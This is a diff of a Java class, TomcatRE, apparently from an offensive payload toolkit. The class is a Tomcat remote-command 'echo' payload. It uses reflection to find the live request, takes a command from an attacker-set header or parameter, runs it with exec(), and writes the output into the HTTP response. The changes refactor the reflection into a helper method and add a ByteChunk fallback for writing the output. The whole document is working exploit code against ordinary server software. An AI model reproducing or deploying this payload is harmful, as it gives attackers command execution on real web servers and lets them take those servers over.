@@ -1,10 +1,12 @@
 package com.ppp.middleware.rceecho;
 
 import com.ppp.annotation.JavaClassModifiable;
+import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.Middleware;
 
 import java.io.InputStream;
 import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 
 /**
  * @author Whoopsunix
@@ -26,6 +28,7 @@ import java.lang.reflect.Field;
  * 9.0.65
  */
 @Middleware(Middleware.Tomcat)
+@JavaClassType(JavaClassType.Default)
 @JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
 public class TomcatRE {
     private static String HEADER;
@@ -59,32 +62,37 @@ public class TomcatRE {
 
                 for (int j = 0; j < processors.size(); j++) {
                     Object processor = processors.get(j);
-                    Object req = getFieldValue(processor, "req");
-                    Object response = req.getClass().getMethod("getResponse").invoke(req);
-                    Object header = req.getClass().getMethod("getHeader", String.class).invoke(req, HEADER);
-                    Object parameters = getFieldValue(req, "parameters");
+                    Object request = getFieldValue(processor, "req");
+                    Object response = invokeMethod(request.getClass(), request, "getResponse", new Class[]{}, new Object[]{});
 
-                    String result = null;
+                    Object header = invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+                    Object parameters = invokeMethod(request.getClass(), request, "getParameters", new Class[]{}, new Object[]{});
+                    Object param = invokeMethod(parameters.getClass(), parameters, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
+
+                    String str = null;
                     if (header != null) {
-                        result = exec((String) header);
-                    } else if (parameters != null) {
-                        String param = parameters.getClass().getMethod("getParameter", String.class).invoke(parameters, PARAM).toString();
-                        result = exec(param);
+                        str = (String) header;
+                    } else if (param != null) {
+                        str = (String) param;
+                    }
+                    String result = exec(str);
+                    invokeMethod(response.getClass(), response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+                    try {
+                        invokeMethod(response.getClass(), response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
+                    } catch (Exception e) {
+                        Class clazz;
+                        try {
+                            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
+                        } catch (ClassNotFoundException e1) {
+                            clazz = Thread.currentThread().getContextClassLoader().loadClass("org.apache.tomcat.util.buf.ByteChunk");
+                        }
+                        Object byteChunk = clazz.newInstance();
+                        invokeMethod(clazz, byteChunk, "setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.getBytes(), 0, result.getBytes().length});
+                        invokeMethod(response.getClass(), response, "doWrite", new Class[]{clazz}, new Object[]{byteChunk});
                     }
 
-                    // doWrite
-                    response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
-                    try {
-                        response.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(response, java.nio.ByteBuffer.wrap(result.getBytes()));
-                    } catch (NoSuchMethodException e) {
-                        Class clazz = getClass("org.apache.tomcat.util.buf.ByteChunk");
-                        Object byteChunk = clazz.newInstance();
-                        clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);
-                        response.getClass().getMethod("doWrite", clazz).invoke(response, new Object[]{byteChunk});
-                    }
                     return;
                 }
-
             }
         } catch (Exception e) {
         }
@@ -128,13 +136,11 @@ public class TomcatRE {
         return field;
     }
 
-    public static Class getClass(String className) throws Exception{
-        Class clazz;
-        try {
-            clazz = Thread.currentThread().getContextClassLoader().loadClass("org.apache.tomcat.util.buf.ByteChunk");
-        } catch (ClassNotFoundException e1) {
-            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
-        }
-        return clazz;
+    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        Method method = cls.getDeclaredMethod(methodName, argsClass);
+        method.setAccessible(true);
+        Object object = method.invoke(obj, args);
+        return object;
     }
+
 }
